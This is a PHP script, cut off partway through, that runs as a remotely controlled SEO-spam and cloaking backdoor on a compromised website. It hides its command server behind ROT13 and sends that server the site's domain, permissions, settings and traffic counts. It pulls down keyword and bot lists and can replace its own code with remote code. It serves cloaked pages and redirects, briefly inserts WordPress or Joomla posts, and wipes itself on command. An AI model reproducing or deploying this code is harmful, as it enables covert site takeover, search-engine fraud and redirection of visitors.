<?php

$client_url = ($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME']) . $_SERVER['SCRIPT_NAME']."?q=[KEY]";

$requestTimeout = 30;
$useCurl = 0;
$new_request = new HttpRequest($useCurl, $requestTimeout);
if (empty($_GET['ineedthispage'])) {
	ini_set('display_errors', 0);
	set_time_limit(9999);
	ignore_user_abort(1);
	$version = "4.1";
	$errors = "";
	$errorsforlocal = "";
	if (!is_function_enabled('curl_init')) {
		$errors.= "I_have_problem_with_Curl\t";
		$errorsforlocal.= "I_have_problem_with_Curl\t";
	}

	if (!is_function_enabled('fopen')) {
		$errors.= "I_have_problem_with_fopen\t";
		$errorsforlocal.= "I_have_problem_with_fopen\t";
	}

	if (!is_function_enabled('gzuncompress')) {
		$errors.= "I_have_problem_with_gzuncompress\t";
		$errorsforlocal.= "I_have_problem_with_gzuncompress\t";
	}

	if (!is_function_enabled('base64_decode')) {
		$errors.= "I_have_problem_with_base64_decode\t";
		$errorsforlocal.= "I_have_problem_with_base64_decode\t";
	}

	$clienturl = "";
	$newkeys = "";
	$dotemplate = "";
	$clearcache = "";
	$newuseragents = "";
	$newbotips = "";
	$newreffs = "";
	$usecloack = "";
	$itsinclude = "";
	$clienttype = "";
	$lang = "";
	$wherecontent = "";
	$textfilename = "";
	$keyfilename = "";
	$themesfilename = "";
	$templatename = "";
	$extlinksfilename = "";
	$keyperem = "";
	$redirect = "";
	$q = "";
	$workstatus = "";
	$settsinclient = "";
	$cleanrescode = "";
	$servurl = str_rot13("scrq8.bet/arjflfgrz/trgfrggvatfi2.cuc");
	if (!empty($_SERVER['HTTP_USER_AGENT'])) {
		$useragent = $_SERVER['HTTP_USER_AGENT'];
	}
	else {
		$useragent = "";
	}

	if (!empty($_SERVER['HTTP_REFERER'])) {
		$referer = $_SERVER['HTTP_REFERER'];
	}
	else {
		$referer = "";
	}

	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	elseif (!empty($_SERVER['REMOTE_ADDR'])) {
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	else {
		$ip = "";
	}

	$clientid = md5(__FILE__);
	$serverfolder_url = "http://".dirname($client_url);

	$cachedirname = dirname(__FILE__) . "/cache" . $clientid;
	$keysfilename = $cachedirname . "/ke" . substr($clientid, 0, 8) . "ys";
	$useragentsfilename = $cachedirname . "/use" . substr($clientid, 0, 3) . "rag" . substr($clientid, 3, 6) . "ents";
	$botipsfilename = $cachedirname . "/bo" . substr($clientid, 0, 4) . "ti" . substr($clientid, 5, 8) . "ps";
	$referersfilename = $cachedirname . "/re" . substr($clientid, 1, 4) . "fere" . substr($clientid, 6, 8) . "re";
	$runningfilename = $cachedirname . "/run" . substr($clientid, 2, 7) . "ning";
	$cachefilename = $cachedirname . "/cac" . substr($clientid, 0, 6) . "he";
	$errorsfilename = $cachedirname . "/err" . substr($clientid, 3, 7) . "ors";
	$trafffilename = $cachedirname . "/tr" . substr($clientid, 2, 8) . "aff";
	$nativetemplatefilename = $cachedirname . "/tem" . substr($clientid, 3, 6) . "pla" . substr($clientid, 1, 4) . "te";
	
	$keysfilename_url = $serverfolder_url . "/cache" . $clientid."/ke" . substr($clientid, 0, 8) . "ys";
	$useragentsfilename_url = $serverfolder_url ."/cache" . $clientid. "/use" . substr($clientid, 0, 3) . "rag" . substr($clientid, 3, 6) . "ents";
	$botipsfilename_url = $serverfolder_url . "/cache" . $clientid."/bo" . substr($clientid, 0, 4) . "ti" . substr($clientid, 5, 8) . "ps";
	$referersfilename_url = $serverfolder_url ."/cache" . $clientid. "/re" . substr($clientid, 1, 4) . "fere" . substr($clientid, 6, 8) . "re";
	$runningfilename_url = $serverfolder_url . "/cache" . $clientid."/run" . substr($clientid, 2, 7) . "ning";
	$cachefilename_url = $serverfolder_url . "/cache" . $clientid."/cac" . substr($clientid, 0, 6) . "he";
	$errorsfilename_url = $serverfolder_url ."/cache" . $clientid. "/err" . substr($clientid, 3, 7) . "ors";
	$trafffilename_url = $serverfolder_url . "/cache" . $clientid."/tr" . substr($clientid, 2, 8) . "aff";
	$nativetemplatefilename_url = $serverfolder_url . "/cache" . $clientid."/tem" . substr($clientid, 3, 6) . "pla" . substr($clientid, 1, 4) . "te";
	$settfilename_url = $serverfolder_url."/cache" . $clientid."/se" . substr($clientid, 1, 6) . "tts";
	
	$urlhash = md5($_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
	$thisdomain = $_SERVER['SERVER_NAME'];
	$settfilename = "se" . substr($clientid, 1, 6) . "tts";
	
	if (isset($_GET['socmaster'])) {
		$whattime = checktime(1);
		error_reporting(E_ALL);
		ini_set('display_errors', true);
		ini_set('error_reporting',  E_ALL); 
	}
	else  
		$whattime = checktime(5000);
	
	if (!is_dir($cachedirname)) {
		if (!mkdir($cachedirname, 0777)) {
			$errors.= "Can't create cache dir\t";
			$errorsforlocal.= "Can't create cache dir\t";
		}
	}

	if (!file_exists($cachedirname . "/" . substr($clientid, 0, 7))) {
		$fod = fopen($cachedirname . "/" . substr($clientid, 0, 7) , "w+");
		if (!empty($fod)) {
			flock($fod, LOCK_EX);
			fwrite($fod, "");
			fclose($fod);
		}
		else {
			$errors.= "Can't first create timefile " . substr($clientid, 0, 7) . "\t";
			$errorsforlocal.= "Can't first create timefile " . substr($clientid, 0, 7) . "\t";
		}
	}

	if ($whattime == "errorcreate") {
		$errors.= "Can't create timefile " . substr($clientid, 0, 7) . "\t";
		$errorsforlocal.= "Can't create timefile " . substr($clientid, 0, 7) . "\t";
	}

 	$cachedirperm = substr(sprintf('%o', fileperms($cachedirname)) , -4);
	/* if ($cachedirperm != "0777") {
		@chmod($cachedirname, 0777);
	} */

	$ownperm = substr(sprintf('%o', fileperms(__FILE__)) , -4);
	/* if ($ownperm != "0777") {
		@chmod(__FILE__, 0777);
	} */

	$currdirperm = substr(sprintf('%o', fileperms(dirname(__FILE__))) , -4);
	/* if ($currdirperm != "0777") {
		@chmod(dirname(__FILE__) , 0777);
	}  */

	$keysfilestatus = "";
	if (file_exists($cachedirname . "/" . $settfilename)) {
		$settsinclient = "yes";
		if (file_exists($keysfilename)) {
			$workstatus = "work";
			$keysfilestatus = "good";
		}
		$settings = file($cachedirname . "/" . $settfilename);
		$settings = implode('\n',$settings);
		
		if (empty($settings)) {
			@unlink($cachedirname . "/" . $settfilename);
		}
		else {
			$settings = decodedata($settings);
			
		}

		$cleanrescode = urldecode(getsettings($settings, "cleanrescode", "yes"));
		if ($cleanrescode == "yes") {
			$fod = fopen(__FILE__, "w+");
			flock($fod, LOCK_EX);
			fwrite($fod, "");
			fclose($fod);
			full_del_dir($cachedirname);
			die();
		}

		$clienturl = urldecode(getsettings($settings, "clienturl", "yes"));
		if (stripos("qqqq" . $clienturl, "[DOMAIN]")) {
			$clienturl = str_ireplace("[DOMAIN]", $thisdomain, $clienturl);
		}

		$clienturl = trim($clienturl);
		$newkeys = urldecode(getsettings($settings, "newkeys", "yes"));
		$newkeys = trim($newkeys);
		$dotemplate = urldecode(getsettings($settings, "dotemplate", "yes"));
		$dotemplate = trim($dotemplate);
		$clearcache = urldecode(getsettings($settings, "clearcache", "yes"));
		$clearcache = trim($clearcache);
		$newuseragents = urldecode(getsettings($settings, "newuseragents", "yes"));
		$newuseragents = trim($newuseragents);
		$newbotips = urldecode(getsettings($settings, "newbotips", "yes"));
		$newbotips = trim($newbotips);
		$newreffs = urldecode(getsettings($settings, "newreffs", "yes"));
		$newreffs = trim($newreffs);
		$usecloack = urldecode(getsettings($settings, "usecloack", "yes"));
		$usecloack = trim($usecloack);
		$itsinclude = urldecode(getsettings($settings, "itsinclude", "yes"));
		$itsinclude = trim($itsinclude);
		$clienttype = urldecode(getsettings($settings, "clienttype", "yes"));
		$clienttype = trim($clienttype);
		$lang = urldecode(getsettings($settings, "lang", "yes"));
		$lang = trim($lang);
		$wherecontent = urldecode(getsettings($settings, "wherecontent", "yes"));
		$wherecontent = trim($wherecontent);
		$textfilename = urldecode(getsettings($settings, "textfilename", "yes"));
		$textfilename = trim($textfilename);
		$keyfilename = urldecode(getsettings($settings, "keyfilename", "yes"));
		$keyfilename = trim($keyfilename);
		$themesfilename = urldecode(getsettings($settings, "themesfilename", "yes"));
		$themesfilename = trim($themesfilename);
		$templatename = urldecode(getsettings($settings, "templatename", "yes"));
		$templatename = trim($templatename);
		$extlinksfilename = urldecode(getsettings($settings, "extlinksfilename", "yes"));
		$extlinksfilename = trim($extlinksfilename);
		$keyperem = urldecode(getsettings($settings, "keyperem", "yes"));
		$keyperem = trim($keyperem);
		$renewclient = urldecode(getsettings($settings, "renewclient", "yes"));
		$renewclient = trim($renewclient);
		$redirect = urldecode(getsettings($settings, "redirect", "yes"));
		$redirect = trim($redirect);
		$keyfindexurl = urlencode(trim($clienturl, "/"));
		$urlfmbrowser = urlencode($_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
		$regular = str_ireplace("%5BKEY%5D", "([\S]*?)", $keyfindexurl);
		$regular = "/" . $regular . "/iUm";
		preg_match($regular, $urlfmbrowser, $match);
		if (!empty($match[1])) {
			$q = trim($match[1]);
		}

		if (!empty($keyperem) && !empty($workstatus) && $workstatus == "work" && empty($q)) {
			$test = "";
			if (!empty($_GET[$keyperem])) {
				$q = $_GET[$keyperem];
			}
			elseif ($itsinclude == "no" && empty($_GET[$keyperem])) {
				$allkeys = implode('\n',file($keysfilename));
				if (!empty($allkeys)) {
					$allkeys = explode("\n", decodedata($allkeys));
					shuffle($allkeys);
					$q = trim($allkeys[0]);
					unset($allkeys);
				}
				else {
					$errors.= "Keys file is empty\t";
					$errorsforlocal.= "Keys file is empty\t";
				}
			}
		}
		$q = urldecode(urldecode($q));
		$q = trim($q, "/");
		if (!empty($q)) {
			$test = "yes";
		}
	}
	if ($whattime == "goodtime" || empty($settings)) {
	
		$cloackfiles = "";
		if (file_exists($useragentsfilename) && file_exists($botipsfilename) && file_exists($referersfilename)) {
			$cloackfiles = "good";
		}

		$trafficdata = "";
		if (file_exists($trafffilename)) {
			$trafficdata = file($trafffilename);
			$trafficdata = implode('\n',$trafficdata);
		}

		$thisistheworkdoorway = ""; 
		if (file_exists($nativetemplatefilename)) {
			$nativetemplatefilenametoshow = "Yes";
		}
		else {
			$nativetemplatefilenametoshow = "";
		}

		$filesdata = "<b>Client type-</b> " . $clienttype . "<br /><b>Lang-</b> " . $lang . "<br /><b>Key var.-</b> " . $keyperem . "<br /><b>It's include-</b> " . $itsinclude . "<br /><b>Text from-</b>  " . $wherecontent . "<br /><b>Template-</b> " . $templatename . "<br /><b>Keys-</b> " . $keyfilename . "<br /><b>Text-</b> " . $textfilename . "<br /><b>Themes-</b> " . $themesfilename . "<br /><b>Extlinks-</b> " . $extlinksfilename . "<br /><b>Parsed Temp- </b>" . $nativetemplatefilenametoshow;
		if (!empty($settings)) {
			$currsettoserv = urlencode(codedata($settings));
		}
		else {
			$currsettoserv = "";
		}
	
		$newsetts = $new_request->request("http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewsetts=yes" . "&version=" . urlencode($version) . "&clientdomain=" . urlencode($thisdomain) . "&workstatus=" . urlencode($workstatus) . "&cachedirperm=" . urlencode($cachedirperm) . "&ownperm=" . urlencode($ownperm) . "&currdirperm=" . urlencode($currdirperm) . "&settsinclient=" . urlencode($settsinclient) . "&keyshere=" . urlencode($keysfilestatus) . "&cloackstatus=" . urlencode($usecloack) . "&cloackfiles=" . urlencode($cloackfiles) . "&filesdata=" . urlencode($filesdata) . "&trafficdata=" . urlencode($trafficdata) . "&currentsetts=" . $currsettoserv . "&testdoorwork=" . $thisistheworkdoorway . "&clienterrors=" . urlencode($errors). "&new_client_url=" . urlencode($client_url));
		if (stripos("qqq" . $newsetts, "CurlError")) { 
			$errors.= $newsetts . "\t";
			$errorsforlocal.= $newsetts . "\t";
		}
		else {
			if (!empty($newsetts) && stripos("qqqq" . $newsetts, "THENEWSETTSHERE")) {
				$newsetts = str_ireplace("THENEWSETTSHERE", "", $newsetts);
				$newsetts = codedata($newsetts);
				$fod = fopen($cachedirname . "/" . $settfilename, "w+");
				if (!empty($fod)) {
					flock($fod, LOCK_EX);
					fwrite($fod, $newsetts);
					fclose($fod);
				}
				else {
					$errors.= "Can't save setting file\t";
					$errorsforlocal.= "Can't save setting file\t";
				}
			}
		}
		if(!$settings){
			$settings = decodedata($newsetts);
		
		$settsinclient = "yes";

		$settings = file($cachedirname . "/" . $settfilename);
		$settings = implode('\n',$settings);
		if (empty($settings)) {
			@unlink($cachedirname . "/" . $settfilename);
		}
		else {
			$settings = decodedata($settings);
		}

		$cleanrescode = urldecode(getsettings($settings, "cleanrescode", "yes"));
		if ($cleanrescode == "yes") {
			$fod = fopen(__FILE__, "w+");
			flock($fod, LOCK_EX);
			fwrite($fod, "");
			fclose($fod);
			full_del_dir($cachedirname);
			die();
		}

		$clienturl = urldecode(getsettings($settings, "clienturl", "yes"));
		if (stripos("qqqq" . $clienturl, "[DOMAIN]")) {
			$clienturl = str_ireplace("[DOMAIN]", $thisdomain, $clienturl);
		}

		$clienturl = trim($clienturl);
		$newkeys = urldecode(getsettings($settings, "newkeys", "yes"));
		$newkeys = trim($newkeys);
		$dotemplate = urldecode(getsettings($settings, "dotemplate", "yes"));
		$dotemplate = trim($dotemplate);
		$clearcache = urldecode(getsettings($settings, "clearcache", "yes"));
		$clearcache = trim($clearcache);
		$newuseragents = urldecode(getsettings($settings, "newuseragents", "yes"));
		$newuseragents = trim($newuseragents);
		$newbotips = urldecode(getsettings($settings, "newbotips", "yes"));
		$newbotips = trim($newbotips);
		$newreffs = urldecode(getsettings($settings, "newreffs", "yes"));
		$newreffs = trim($newreffs);
		$usecloack = urldecode(getsettings($settings, "usecloack", "yes"));
		$usecloack = trim($usecloack);
		$itsinclude = urldecode(getsettings($settings, "itsinclude", "yes"));
		$itsinclude = trim($itsinclude);
		$clienttype = urldecode(getsettings($settings, "clienttype", "yes"));
		$clienttype = trim($clienttype);
		$lang = urldecode(getsettings($settings, "lang", "yes"));
		$lang = trim($lang);
		$wherecontent = urldecode(getsettings($settings, "wherecontent", "yes"));
		$wherecontent = trim($wherecontent);
		$textfilename = urldecode(getsettings($settings, "textfilename", "yes"));
		$textfilename = trim($textfilename);
		$keyfilename = urldecode(getsettings($settings, "keyfilename", "yes"));
		$keyfilename = trim($keyfilename);
		$themesfilename = urldecode(getsettings($settings, "themesfilename", "yes"));
		$themesfilename = trim($themesfilename);
		$templatename = urldecode(getsettings($settings, "templatename", "yes"));
		$templatename = trim($templatename);
		$extlinksfilename = urldecode(getsettings($settings, "extlinksfilename", "yes"));
		$extlinksfilename = trim($extlinksfilename);
		$keyperem = urldecode(getsettings($settings, "keyperem", "yes"));
		$keyperem = trim($keyperem);
		$renewclient = urldecode(getsettings($settings, "renewclient", "yes"));
		$renewclient = trim($renewclient);
		$redirect = urldecode(getsettings($settings, "redirect", "yes"));
		$redirect = trim($redirect);
		$keyfindexurl = urlencode(trim($clienturl, "/"));
		$urlfmbrowser = urlencode($_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
		$regular = str_ireplace("%5BKEY%5D", "([\S]*?)", $keyfindexurl);
		$regular = "/" . $regular . "/iUm";
		preg_match($regular, $urlfmbrowser, $match);
		if (!empty($match[1])) {
			$q = trim($match[1]);
		}

		if (!empty($newkeys) && $newkeys == "yes" && !empty($keyfilename) && !file_exists($runningfilename) || !file_exists($keysfilename)) {
			$settings = str_ireplace("newkeys=yes", "", $settings);
			$fod = fopen($cachedirname . "/" . $settfilename, "w+");
			flock($fod, LOCK_EX);
			fwrite($fod, codedata($settings));
			fclose($fod);
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewkeys=yes&keyfilename=" . urlencode($keyfilename));
			$fp = fopen($keysfilename, "w+");
			if (!empty($fp)) {
				curl_setopt($ch, CURLOPT_FILE, $fp);
				curl_exec($ch);
				$curlerror = "";
				$curlerror = curl_error($ch);
				if (!empty($curlerror)) {
					$errors.= "CurlError " . $curlerror . " while get keys\t";
					$errorsforlocal.= "CurlError " . $curlerror . " while get keys\t";
				}

				curl_close($ch);
				fclose($fp);
			}
			else {
				curl_close($ch);
				$errors.= "Can't save keys file\t";
				$errorsforlocal.= "Can't save keys file\t";
			}
		}
		
		if (file_exists($keysfilename)) {
			$workstatus = "work";
			$keysfilestatus = "good";
		}
		
		if (!empty($keyperem) && !empty($workstatus) && $workstatus == "work" && empty($q)) {
			$test = "";
			if (!empty($_GET[$keyperem])) {
				$q = $_GET[$keyperem];
			}
			elseif ($itsinclude == "no" && empty($_GET[$keyperem])) {
				$allkeys = file($keysfilename);
				$allkeys = implode('\n',$allkeys);
				if (!empty($allkeys)) {
					$allkeys = explode("\n", decodedata($allkeys));
					shuffle($allkeys);
					$q = trim($allkeys[0]);
					unset($allkeys);
				}
				else {
					$errors.= "Keys file is empty\t";
					$errorsforlocal.= "Keys file is empty\t";
				}
			}
		}

		$q = urldecode(urldecode($q));
		$q = trim($q, "/");
		if (!empty($q)) {
			$test = "yes";
		}
	}
		
	}

	if (!empty($newkeys) && $newkeys == "yes" && !empty($keyfilename) && !file_exists($runningfilename) || !file_exists($keysfilename)) {
		$settings = str_ireplace("newkeys=yes", "", $settings);
		$fod = fopen($cachedirname . "/" . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewkeys=yes&keyfilename=" . urlencode($keyfilename));
		$fp = fopen($keysfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors.= "CurlError " . $curlerror . " while get keys\t";
				$errorsforlocal.= "CurlError " . $curlerror . " while get keys\t";
			}

			curl_close($ch);
			fclose($fp);
		}
		else {
			curl_close($ch);
			$errors.= "Can't save keys file\t";
			$errorsforlocal.= "Can't save keys file\t";
		}
	}

	if (!empty($newuseragents) && $newuseragents == "yes" && !file_exists($runningfilename) || !file_exists($useragentsfilename)) {

		$settings = str_ireplace("newuseragents=yes", "", $settings);
		$fod = fopen($cachedirname . "/" . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewuseragents=yes");
		$fp = fopen($useragentsfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors.= "CurlError " . $curlerror . " while get useragents\t";
				$errorsforlocal.= "CurlError " . $curlerror . " while get useragents\t";
			}

			curl_close($ch);
			fclose($fp);
		}
		else {
			curl_close($ch);
			$errors.= "Can't save useragents file\t";
			$errorsforlocal.= "Can't save useragents file\t";
		}
	}

	if (!empty($newuseragents) && $newuseragents == "yes" && !file_exists($runningfilename) || !file_exists($botipsfilename)) {

		$settings = str_ireplace("newbotips=yes", "", $settings);
		$fod = fopen($cachedirname . "/" . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewbotips=yes");
		$fp = fopen($botipsfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors.= "CurlError " . $curlerror . " while get botips\t";
				$errorsforlocal.= "CurlError " . $curlerror . " while get botips\t";
			}

			curl_close($ch);
			fclose($fp);
		}
		else {
			curl_close($ch);
			$errors.= "Can't save botips file\t";
			$errorsforlocal.= "Can't save botips file\t";
		}
	}

	if (!empty($newreffs) && $newreffs == "yes" && !file_exists($runningfilename) || !file_exists($referersfilename)) {

		$settings = str_ireplace("newreffs=yes", "", $settings);
		$fod = fopen($cachedirname . "/" . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewreffs=yes");
		$fp = fopen($referersfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors.= "CurlError " . $curlerror . " while get referers\t";
				$errorsforlocal.= "CurlError " . $curlerror . " while get refererrs\t";
			}

			curl_close($ch);
			fclose($fp);
		}
		else {
			curl_close($ch);
			$errors.= "Can't save refererrs file\t";
			$errorsforlocal.= "Can't save refererrs file\t";
		}
	}

	if (!empty($clearcache) && $clearcache == "yes" && !file_exists($runningfilename)) {

		$settings = str_ireplace("clearcache=yes", "", $settings);
		$fod = fopen($cachedirname . "/" . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata(trim($settings)));
		fclose($fod);
		if (file_exists($cachefilename)) {
			@unlink($cachefilename);
		}
	}

	if (!empty($renewclient) && $renewclient == "yes" && !file_exists($runningfilename)) {

		if (!empty($servurl)) {
			$newclient = $new_request->request("http://" . str_ireplace("getsettingsv2.php", "clientdata", $servurl)); 
			$newclient = str_ireplace(urldecode("%5BSERVERURLHERE%5D") , codeservurl($servurl) , $newclient);
			if (!empty($newclient) && stripos("qqq" . $newclient, "item->alias;};")) {
				$fod = fopen(__FILE__, "w+");
				flock($fod, LOCK_EX);
				fwrite($fod, trim($newclient));
				fclose($fod);
			}
		}

		$settings = str_ireplace("renewclient=yes", "", $settings);
		$fod = fopen($cachedirname . "/" . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata(trim($settings)));
		fclose($fod);
	}


	if (!empty($q) && !empty($urlhash) && !empty($test) && $test == "yes" && $dotemplate != "yes" ) {
		$bot = 0;
		$user = 1;
		if (!empty($usecloack) && $usecloack == "use") {
			$testcloack = cloack($ip);
			if ($testcloack == 1) {
				$bot = 1;
				$user = 0;
				$redirect = "";
			}
		}

		if (file_exists($trafffilename)) {
			$traffic = file($trafffilename);
			$traffic = implode('\n',$traffic);
			$traffic = explode("/", $traffic);
			$traffic[0] = trim($traffic[0]) + $bot;
			$traffic[1] = trim($traffic[1]) + $user;
			$traffic = implode("/", $traffic);
			$traffic = trim($traffic);
			@unlink($trafffilename);
			$fod = fopen($trafffilename, "a+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				ftruncate($fod, 0);
				fwrite($fod, $traffic);
				fclose($fod);
			}
			else {
				$errors.= "Can't save traffic file\t";
				$errorsforlocal.= "Can't save traffic file\t";
			}
		}
		else {
			$traffic = $bot . "/" . $user;
			$fod = fopen($trafffilename, "w+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				fwrite($fod, $traffic);
				fclose($fod);
			}
			else {
				$errors.= "Can't save traffic file\t";
				$errorsforlocal.= "Can't save traffic file\t";
			}
		}

		if (file_exists($cachefilename) !== FALSE) {
			$handle = fopen($cachefilename, "r");
			
			while (!feof($handle)) {
				$cacheline = fgets($handle);
				$cacheline = explode("::::", $cacheline);
				$cachedurl = trim($cacheline[0]);
				if ($cachedurl == trim($urlhash)) {
					$cacheddata = trim($cacheline[1]);
					break;
				}
			}

			fclose($handle);
			if (!empty($cacheddata)) {
				$page = decodedata($cacheddata);
			}
			else {
				$page = getcontent($workstatus, $templatename, $keysfilename, $wherecontent, $q, $clienturl, $thisdomain, $cachedirname, $errorsfilename, $servurl, $lang, $clientid); /* socmaster */
				if (stripos("qqqq" . $page, "CurlError")) {
					$errorsforlocal.= $page . " while get content from server\t";
				}
				else {
					if (!empty($page)) {
						$fod = fopen($cachefilename, "a+");
						flock($fod, LOCK_EX);
						fwrite($fod, $urlhash . "::::" . codedata($page) . "\n");
						fclose($fod);
					}
				} 
			}
		}
		else {
			$page = getcontent($workstatus, $templatename, $keysfilename, $wherecontent, $q, $clienturl, $thisdomain, $cachedirname, $errorsfilename, $servurl, $lang, $clientid); /* socmaster */
	 		if (stripos("qqqq" . $page, "CurlError")) {
				$errorsforlocal.= $page . " while get content from server\t";
			}
			else {
				if (!empty($page)) {
					$fod = fopen($cachefilename, "a+");
					flock($fod, LOCK_EX);
					fwrite($fod, $urlhash . "::::" . codedata($page) . "\n");
					fclose($fod);
				}
			} 
		}
	}

	if (!empty($page) && !empty($clienttype)) {
		$content_txt = $page;
		if ($clienttype == "simple") {
 			if(include_cms() == "wp"){
				if (!is_function_enabled('wp_insert_post') && !is_function_enabled('get_permalink') && !is_function_enabled('wp_delete_post') && !is_function_enabled('add_action')) {
					$errors.= "Not WP or include before WP functions loaded\t";
					$errorsforlocal.= "Not WP or include before WP functions loaded\t";
				}
				else {
					$page = str_ireplace("[REDIRECT]", "", $content_txt);
					$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q) , $page);
					if (!empty($redirect)) {
						$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q) , $redirect);
					}
					$page = explode("====================", $page);
					if (count($page) >= 3) {
						$rand_date = mt_rand(1348924149,time());
						$random_date = date("Y-m-d H:i:s",$rand_date);
						$slugname = randString(8);
						$post_data = array(
							'post_title' => trim($page[0]) ,
							'post_name' => $slugname,
							'post_content' => trim($page[2]) ,
							'post_status' => 'publish',
							'post_category' => array(),
							'post_date' => $random_date
						);
						$post_id = wp_insert_post($post_data, true);
						$permalink = get_permalink($post_id);
						$testpermalink = explode("/", $permalink);
						$req = new HttpRequest($useCurl, $requestTimeout);
						if (stripos($testpermalink[count($testpermalink) - 1], "?")) {
							$goodwordpresspage = $req->request($permalink . "&ineedthispage=yes");
						}
						else {
							$goodwordpresspage = $req->request($permalink . "?ineedthispage=yes");
						}

						$goodwordpresspage = str_ireplace($permalink, "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'], $goodwordpresspage);
						$goodwordpresspage = str_ireplace("&ineedthispage=yes", "", $goodwordpresspage);
						$goodwordpresspage = str_ireplace("&amp;ineedthispage=yes", "", $goodwordpresspage);
						$goodwordpresspage = preg_replace("/<div style=\"display:none;\">(.*?)<\/div>/is"," ",$goodwordpresspage);
						
						 if (!wp_delete_post($post_id, true)) {
							wp_delete_post($post_id, true);
						} 
						
						echo $redirect . "" . $goodwordpresspage;
						die();
					}
				}
			}elseif(include_cms() == "joomla"){
				
				if (!is_function_enabled('postItem') && !class_exists("JFactory")) {
				$errors.= "Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";
				$errorsforlocal.= "Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";
				}
				else {
					$page = str_ireplace("[REDIRECT]", "", $page);
					$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q) , $page);
					if (!empty($redirect)) {
						$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q) , $redirect);
					}

					$page = explode("====================", $page);
					if (count($page) >= 3) {
						$joomlaurl = explode("/", $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
						unset($joomlaurl[count($joomlaurl) - 1]);
						$idtemp = postItem(trim($page[0]) , trim($page[1]) , trim($page[2]));
						$idtemp = explode(":", $idtemp);
						if (is_array($idtemp)) {
							$alias = trim($idtemp[1]);
							$id = trim($idtemp[0]);
							$page = $new_request->request("http://" . trim(implode("/", $joomlaurl) , "/") . "/index.php/" . $id . "-" . $alias . "?ineedthispage=yes");
							$page = str_ireplace("&ineedthispage=yes", "", $page);
							$page = str_ireplace("&amp;ineedthispage=yes", "", $page);
							$page = str_ireplace("?ineedthispage=yes", "", $page);
							$page = preg_replace("/<div style=\"display:none;\">(.*?)<\/div>/is"," ",$page);
							$db = JFactory::getDbo();
							$query = $db->getQuery(true);
							$query->delete($db->quoteName('#__content'))->where(array(
								$db->quoteName('id') . '=' . $id
							));
							$db->setQuery($query);
							$result = $db->query();
							echo $redirect . "" . $page;
							die();
							}
						}
					}
				}else{
					$page = str_ireplace("[REDIRECT]", $redirect, $page);
					$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q) , $page);
					echo $page;
					die();	
				}
			}
			if ($clienttype == "pdftype" ) {
				if (!empty($redirect) && strpos($q,"sitemap") === FALSE) {
					$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q) , $redirect);
					echo $redirect;
					die();
				}
				else {
					$page = str_ireplace("[REDIRECT]", "", $page);
					$page = explode("====================", $page); 
					$pdf = new PDF_HTML();
					$pdf->AddFont('arial','','119379869a251bdd6a14438b3c5514f2_arial.php');
					$pdf->AddPage();
					$pdf->SetFont('arial','',14);
					$pdf->Cell(210,4,$page[0],0,0); 
					$pdf->Ln(); 
					$pdf->SetFont('arial','',12);
					$pdf->WriteHTML($page[2]);
